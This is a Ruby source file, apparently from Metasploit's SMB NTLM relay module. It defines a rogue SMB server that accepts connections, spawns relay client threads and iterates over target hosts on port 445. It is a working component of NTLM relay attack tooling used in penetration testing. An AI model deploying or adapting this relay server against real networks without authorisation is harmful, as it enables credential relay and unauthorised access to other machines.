module Msf::Exploit::Remote::SMB::Relay::NTLM
  # This class provides the SMB server core. Settings that are relevant server wide are managed by this object.
  # Currently, the server only supports negotiating and authenticating requests. No other server functionality is
  # available at this time. The negotiating and authentication is supported for SMB versions 1 through 3.1.1.
  class Server < ::RubySMB::Server
    def initialize(relay_timeout:, relay_targets:, listener:, thread_manager:, **kwargs)
      super(**kwargs)

      @relay_targets = relay_targets
      @relay_timeout = relay_timeout
      @listener = listener
      @thread_manager = thread_manager
    end

    # Run the server and accept any connections. For each connection, the block will be executed if specified. When the
    # block returns false, the loop will exit and the server will no long accept new connections.
    def run(&block)
      loop do
        sock = @socket.accept
        server_client = Msf::Exploit::Remote::SMB::Relay::NTLM::ServerClient.new(
          self,
          RubySMB::Dispatcher::Socket.new(sock),
          relay_targets: TargetList.new(@relay_targets),
          relay_timeout: @relay_timeout,
          listener: @listener,
        )
        @connections << Connection.new(server_client, @thread_manager.spawn("SMBRelayServerClient for #{sock.peerinfo}", false, server_client) do |server_client|
          begin
            logger.info("starting thread for connection")
            server_client.run
          rescue => e
            print_error "#{e.message}"
            elog(e)
          end
          logger.info("ending thread for connection")
        end)

        break unless block.nil? || block.call(server_client)
      end
    end

    class Target
      def initialize(ip, port, protocol)
        raise ArgumentError if ip.nil? || port.nil? || protocol.nil?

        @ip = ip
        @port = port
        @protocol = protocol
      end

      attr_reader :ip, :port, :protocol
    end

    # A thread safe target list. The provided targets will be iterated over via the {next} method.
    class TargetList
      include MonitorMixin

      # @param [Array<String>] targets
      def initialize(targets)
        super()
        @walker = Rex::Socket::RangeWalker.new(targets)
      end

      # Return the next available target, or nil
      def next
        synchronize do
          next_ip = @walker.next_ip
          return nil if next_ip.nil?

          # TODO: Confirm HTTP relay semantics
          Target.new(next_ip, 445, :smb)
        end
      end
    end

    def close
      @connections.each do |connection|
        begin
          connection.thread.kill
        rescue StandardError => e
          elog('Failed SMBRelayServerClient', error: e)
        end
      end
    end
  end
end
